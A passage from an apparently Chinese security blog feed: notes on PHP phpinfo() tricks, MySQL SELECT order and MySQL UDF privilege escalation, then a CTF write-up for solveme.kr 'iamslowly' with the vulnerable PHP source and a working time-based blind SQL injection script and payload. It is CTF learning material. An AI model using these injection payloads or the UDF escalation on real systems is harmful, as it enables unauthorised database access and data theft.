//可以从返回信息中得到版本，其他预置函数都可以</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;$&#123;phpinfo()&#125;&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://myndtt.github.io/images/39.png" alt="39"></p><h3 id="二-select语句执行流程"><a href="#二-select语句执行流程" class="headerlink" title="二.select语句执行流程"></a>二.select语句执行流程</h3><p>一直想知道select语句执行顺序到底是怎样的，找到一篇十分详细的文章解决了我的问题。</p><p><a href="https://www.cnblogs.com/annsshadow/p/5037667.html" target="_blank" rel="noopener">https://www.cnblogs.com/annsshadow/p/5037667.html</a>    </p><p>(看原文档更好)</p><p>select语句的原型可视为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT</span><br><span class="line">    &lt; select_list &gt;</span><br><span class="line">FROM</span><br><span class="line">    &lt; left_table &gt; &lt; join_type &gt;</span><br><span class="line">JOIN &lt; right_table &gt; ON &lt; join_condition &gt;</span><br><span class="line">WHERE</span><br><span class="line">    &lt; where_condition &gt;</span><br><span class="line">GROUP BY</span><br><span class="line">    &lt; group_by_list &gt;</span><br><span class="line">HAVING</span><br><span class="line">    &lt; having_condition &gt;</span><br><span class="line">ORDER BY</span><br><span class="line">    &lt; order_by_condition &gt;</span><br><span class="line">LIMIT &lt; limit_number &gt;</span><br></pre></td></tr></table></figure><p>执行顺序是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FROM &lt;left_table&gt;</span><br><span class="line">ON &lt;join_condition&gt;</span><br><span class="line">&lt;join_type&gt; JOIN &lt;right_table&gt;</span><br><span class="line">WHERE &lt;where_condition&gt;</span><br><span class="line">GROUP BY &lt;group_by_list&gt;</span><br><span class="line">HAVING &lt;having_condition&gt;</span><br><span class="line">SELECT </span><br><span class="line">DISTINCT &lt;select_list&gt;</span><br><span class="line">ORDER BY &lt;order_by_condition&gt;</span><br><span class="line">LIMIT &lt;limit_number&gt;</span><br></pre></td></tr></table></figure><p>简单解析可为：首先看看select的字段来自哪里，即先解析<code>from</code>得到后面的表，如何有多表且是<code>用join</code>联合起来则就按<code>on</code>条件进行联合。得到字段来自的表后，将表加入的内存中。随后解析<code>where</code>按一定条件进行筛选，得到新的虚表。有<code>group by</code>则将该虚表按条件进行重组，重组后如果有<code>having</code>则对按条件对重组后的表进行过滤得到全新的虚表，随后<code>select</code>进行字段选择，如果有<code>disinct</code>存在就将重复的删除(指定索引唯一去除重复数据)。z再然后就是<code>order by</code>排序和<code>limit</code>进行限定。举一个简单小栗子，sql注入常会出现这样的句子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from user where username=&apos;a&apos; or 1</span><br></pre></td></tr></table></figure><p>首先mysql进行词法分析，发现第一个字为select关键字，随即找from关键字确定表为user，将user表加载至内存得到虚表1，此时指针指向虚表1中第一条数据，然后去找where关键字进行条件判断该数据是否符合要求。这里条件为<code>username=&#39;a&#39; or 1</code> 恒返回1为真，也即虚表1中第一条数据符合要求，将 数据加载至虚表2中，表中所有数据检索完后，执行select,从虚表2中进行字段选择得到虚表3，随后将虚表3进行返回。（这一段表达可能有误，但是大致过程是如此）</p><h2 id="0x02-篱笆外"><a href="#0x02-篱笆外" class="headerlink" title="0x02.篱笆外"></a>0x02.篱笆外</h2><p>mysql中udf库，链接：<a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</a></p><p>这是一道web题，提示 <code>咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦</code></p><p>根据文件udf.so查找资料到有这么一句话：<code>用户可以自己建立包含自定义函数得动态库来创建自定义函数，简称udf.这里是关键</code>。由于是.so动态库则用linux(ubuntu)环境进行测试。</p><h4 id="1-过程"><a href="#1-过程" class="headerlink" title="1.过程"></a>1.过程</h4><p>ubuntu下载mysql，将下载得<code>udf.so.02f8981200697e5eeb661e64797fc172</code>放入mysql默认.so文件的目录(/usr/lib/mysql/plugin)下,登入mysql依次执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create function help_me returns string soname &apos;udf.so.02f8981200697e5eeb661e64797fc172&apos;;//激活该//函数</span><br><span class="line">select help_me();//根据提示执行后面</span><br><span class="line">create function getflag returns string soname &apos;udf.so.02f8981200697e5eeb661e64797fc172&apos;;</span><br><span class="line">select getflag();</span><br></pre></td></tr></table></figure><h4 id="2-其他"><a href="#2-其他" class="headerlink" title="2.其他"></a>2.其他</h4><p>可以利用此.so文件对mysql进行提权。如果有sql注入点可以上传文件，由此那么我们可以上传一个可以执行系统函数的.so文件进行提权。</p><p><a href="http://www.91ri.org/16540.html" target="_blank" rel="noopener">http://www.91ri.org/16540.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h2&gt;&lt;p&gt;这完全是一篇水文，只是记录了一下平时遇到的一些问题及查找到的解决方法。&lt;/p&gt;
&lt;h2 id=&quot;0x01-琴声悠悠&quot;&gt;&lt;a href=&quot;#0x01-琴声悠悠&quot; class=&quot;headerlink&quot; title=&quot;0x01.琴声悠悠&quot;&gt;&lt;/a&gt;0x01.琴声悠悠&lt;/h2&gt;&lt;h3 id=&quot;一-echo-“-phpinfo-”可以输出php环境&quot;&gt;&lt;a href=&quot;#一-echo-“-phpinfo-”可以输出php环境&quot; class=&quot;headerlink&quot; title=&quot;一.echo “{${phpinfo()}}”可以输出php环境&quot;&gt;&lt;/a&gt;一.echo “{${phpinfo()}}”可以输出php环境&lt;/h3&gt;&lt;p&gt;这个问题很早以前就有人提出来了，但是一直都没什么人解答，我其实也不知道真实的情况具体是什么，只是根据测试去推测可能是什么。&lt;/p&gt;
&lt;h4 id=&quot;1-phpinfo&quot;&gt;&lt;a href=&quot;#1-phpinfo&quot; class=&quot;headerlink&quot; title=&quot;1.phpinfo()&quot;&gt;&lt;/a&gt;1.phpinfo()&lt;/h4&gt;&lt;p&gt;首先phpinfo()函数是php的内置函数，函数原型是&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://myndtt.github.io/images/36.png&quot; alt=&quot;36&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="php" scheme="https://myndtt.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>solveme.kr-iamsowly</title>
    <link href="https://myndtt.github.io/2017/11/14/iamsowly/"/>
    <id>https://myndtt.github.io/2017/11/14/iamsowly/</id>
    <published>2017-11-14T01:34:11.000Z</published>
    <updated>2019-09-22T05:04:46.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-一波"><a href="#0x00-一波" class="headerlink" title="0x00.一波"></a>0x00.一波</h2><p>题目链接 <a href="http://iamslowly.thinkout.rf.gd" target="_blank" rel="noopener">http://iamslowly.thinkout.rf.gd</a></p><p>这是solveme.kr中最后一道题目,是一道web方面的题（本文没有图片，全是文字！）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">// It's 'I am slowly' problem of 'Solve Me'.</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">   $table = <span class="string">'iamslowly_'</span>.ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">   $answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">       $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">           <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">       $result = mysqli_fetch_array(</span><br><span class="line">           mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">           mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">           $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">           mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">           mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">       $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>代码逻辑很清楚，首先根据访问者的IP来创建一个表，然后在这个表的answer字段插入一个夹含着随机数并且进行两次哈希的摘要，并且表中有一个count字段，再然后需要我们去猜这个answer字段中的摘要，每错一次count值加1，当count等于12，这个表删除，下次访问将会重新建立起表并且设置新的answer。</p><h2 id="0x01-三折"><a href="#0x01-三折" class="headerlink" title="0x01.三折"></a>0x01.三折</h2><h3 id="1-update"><a href="#1-update" class="headerlink" title="1.update"></a>1.update</h3><p>因为answer我们完全可控，所以是否可以再下列语句中，构造合适的answer来更新或者更改表中的answer，这样下次就一定可以猜到了,然而翻遍了mysql语句大全并没有这类的语法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`=&apos;&#123;$answer&#125;&apos;;&quot;</span><br></pre></td></tr></table></figure><h3 id="2-mt-rand"><a href="#2-mt-rand" class="headerlink" title="2.mt_rand"></a>2.mt_rand</h3><p>这个伪随机有什么地方可以突破呢，然而并没有，每次猜错了，下次访问时，php重新运行，种子重置。</p><h3 id="3-DNS解析"><a href="#3-DNS解析" class="headerlink" title="3.DNS解析"></a>3.DNS解析</h3><p>抱歉，试了，没有用。(也许可能跟平台有关系)</p><h2 id="0x02-从前从前"><a href="#0x02-从前从前" class="headerlink" title="0x02.从前从前"></a>0x02.从前从前</h2><p>重新回到代码，看看有什么可以突破的地方。聚焦在count===12，当count等于12时，才删掉表，如果我们可以绕过这个12，是不是就可以猜很多次，然后用时间盲注来获取我们想要的东西呢！那么如何突破这个12成为关键。</p><p><span style="color: #339966;">回到代码逻辑，猜一个answser，先判断count是否为12，然后在判断answer是否对，不对，count加1，如果当count等于11，我们去猜一个answer，然后在它进行判断answer是否对的时候，再进行一个访问猜一个answer，这样两次访问过后count会变成13，从而绕过count===12,接下来可以随便猜！等于说count=11,执行一条sleep很久的语句，同时过一会执行一条sleep很短的语句，后者执行完count加1，然后前者睡完后，count加1，这时候count等于13了，就是如此！（mysql sleep时间累加的，返回值为0）</span></p><h2 id="0x03-故事的最后"><a href="#0x03-故事的最后" class="headerlink" title="0x03.故事的最后"></a>0x03.故事的最后</h2><p>附上脚本 没有用到的可以删掉哈…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">string = <span class="string">"1234567890abcdef"</span></span><br><span class="line">ul=<span class="string">"http://iamslowly.thinkout.rf.gd/index.php?answer="</span></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">"utf-8"</span>)</span><br><span class="line">path=<span class="string">"C:\\Program Files (x86)\\Google\\Chrome\\chromedriver_win32\\chromedriver.exe"</span></span><br><span class="line">driver = webdriver.Chrome(path)</span><br><span class="line"><span class="comment">#ul="http://127.0.0.1/test1.php?answer=1"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doinject</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url=ul+payload</span><br><span class="line">    <span class="keyword">print</span> url</span><br><span class="line">    start_time=time.time()</span><br><span class="line">    user_agent = <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span></span><br><span class="line">    info = &#123; <span class="string">'User-Agent'</span> : user_agent,</span><br><span class="line">             <span class="string">'Host'</span> : <span class="string">'iamslowly.thinkout.rf.gd'</span>,</span><br><span class="line">             <span class="string">'Cookies'</span> : <span class="string">'__test=dad1d895748e3a49d9d9e72c4c160171'</span></span><br><span class="line">             &#125;</span><br><span class="line">    start_time=time.time()</span><br><span class="line">    driver.get(url)</span><br><span class="line">    <span class="comment">#the_page=driver.page_source.encode('utf-8')</span></span><br><span class="line">    <span class="comment">#the_page = response.read()</span></span><br><span class="line">    times = time.time() - start_time</span><br><span class="line">    <span class="keyword">print</span>  times</span><br><span class="line">    <span class="keyword">if</span> times &gt; <span class="number">30</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doinject1</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url=ul+payload</span><br><span class="line">    <span class="keyword">print</span> url</span><br><span class="line">    user_agent = <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span></span><br><span class="line">    info = &#123; <span class="string">'User-Agent'</span> : user_agent,</span><br><span class="line">             <span class="string">'Host'</span>:<span class="string">'iamslowly.thinkout.rf.gd'</span>,</span><br><span class="line">             <span class="string">'Cookies'</span>:<span class="string">'__test=dad1d895748e3a49d9d9e72c4c160171'</span></span><br><span class="line">             &#125;</span><br><span class="line">    driver.get(url)</span><br><span class="line">    the_page=driver.page_source.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> the_page.find(<span class="string">"Game"</span>)</span><br><span class="line">    <span class="keyword">if</span> (the_page.find(<span class="string">"Game over"</span>)&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdump5</span><span class="params">(a)</span>:</span></span><br><span class="line">pw=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,a):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">data = <span class="string">"' or 1=1 and @ans:=answer union select sleep(case when @ans like '&#123;&#125;&#123;&#125;%' then 30 else 0 END),2-- -"</span>.format(pw,j)</span><br><span class="line"><span class="comment">#data = requests.utils.quote(data)</span></span><br><span class="line"><span class="keyword">if</span> doinject(str(data)):</span><br><span class="line">pw = pw + str(j)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[!] found"</span>,pw</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]The answer is %s"</span> % pw</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] ok ! get it!'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">x=str(x)+<span class="string">"'-- -"</span></span><br><span class="line"><span class="keyword">if</span> doinject1(str(x)):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"no"</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'gg'</span> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">a=<span class="number">32</span></span><br><span class="line">getdump5(a)</span><br><span class="line"><span class="comment">#test()</span></span><br></pre></td></tr></table></figure><p>（一般来说二分法快一些,只不过时间盲注不适合二分，至少这里是，为了准确性成功一次要等很长时间）</p><p>这个网站有一个aes.js保护，并且上诉那个办法奇怪的是 两次不同时间的sleep同时睡完 ，本地没有成功，原网站倒是可以使count大于13（这里有点问题，目前没明白）。最后靠自动化让浏览器去实现了，由于几次都跑错了，所以特意在成功的时候sleep久一点，😔😔………………时间长度额….希望有人改进一下,或者说有其他方法也不一定…</p><p><img src="http://myndtt.github.io/images/35.png" alt="img"></p><p>最后感谢李师兄和龙师兄的帮助^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-一波&quot;&gt;&lt;a href=&quot;#0x00-一波&quot; class=&quot;headerlink&quot; title=&quot;0x00.一波&quot;&gt;&lt;/a&gt;0x00.一波&lt;/h2&gt;&lt;p&gt;题目链接 &lt;a href=&quot;http://iamslowly.thinkout.rf.gd&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://iamslowly.thinkout.rf.gd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这是solveme.kr中最后一道题目,是一道web方面的题（本文没有图片，全是文字！）&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;// It&#39;s &#39;I am slowly&#39; problem of &#39;Solve Me&#39;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;__DIR__&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;/lib.php&#39;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   $table = &lt;span class=&quot;string&quot;&gt;&#39;iamslowly_&#39;&lt;/span&gt;.ip2long($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   $answer = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;answer&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($answer))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;SQL server down&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $result = mysqli_fetch_array(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           mysqli_query($con, &lt;span class=&quot;string&quot;&gt;&quot;SELECT `count` FROM `&amp;#123;$table&amp;#125;`;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($result))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           mysqli_query($con, &lt;span class=&quot;string&quot;&gt;&quot;CREATE TABLE IF NOT EXISTS `&amp;#123;$table&amp;#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           $new_answer = md5(sha1(&lt;span class=&quot;string&quot;&gt;&#39;iamslowly_&#39;&lt;/span&gt;.mt_rand().&lt;span class=&quot;string&quot;&gt;&#39;_&#39;&lt;/span&gt;.mt_rand().&lt;span class=&quot;string&quot;&gt;&#39;_&#39;&lt;/span&gt;.mt_rand()));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           mysqli_query($con, &lt;span class=&quot;string&quot;&gt;&quot;INSERT INTO `&amp;#123;$table&amp;#125;` (`answer`,`count`) VALUES (&#39;&amp;#123;$new_answer&amp;#125;&#39;,1);&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &amp;#125;&lt;span class=&quot;keyword&quot;&gt;elseif&lt;/span&gt;($result[&lt;span class=&quot;string&quot;&gt;&#39;count&#39;&lt;/span&gt;] === &lt;span class=&quot;string&quot;&gt;&#39;12&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           mysqli_query($con, &lt;span class=&quot;string&quot;&gt;&quot;DROP TABLE `&amp;#123;$table&amp;#125;`;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Game 